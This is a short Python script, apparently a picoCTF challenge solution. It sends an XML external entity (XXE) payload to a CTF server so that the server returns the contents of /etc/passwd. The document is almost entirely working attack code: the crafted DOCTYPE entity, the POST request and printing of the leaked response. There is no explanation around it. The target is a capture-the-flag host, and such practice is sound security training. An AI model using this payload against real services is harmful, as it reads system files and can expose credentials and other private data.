import requests
url='http://saturn.picoctf.net:55758'

#use post method to send data
#xxe is a xml external entity attack
text='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE faa [<!ENTITY xxe SYSTEM "/etc/passwd" >]><data><ID>&xxe;2</ID></data>'
# text='<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>'
headers = {'Content-Type': 'application/xml',
           'Accept-Charset': 'UTF-8',
           'content-length': str(len(text)) ,
           'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}


r = requests.post(url+'/data', data=text, headers=headers)
# r = requests.get(url)

print(r)
print(r.text)

print('------------------')
r = requests.get(url)
print(r)
print(r.text)
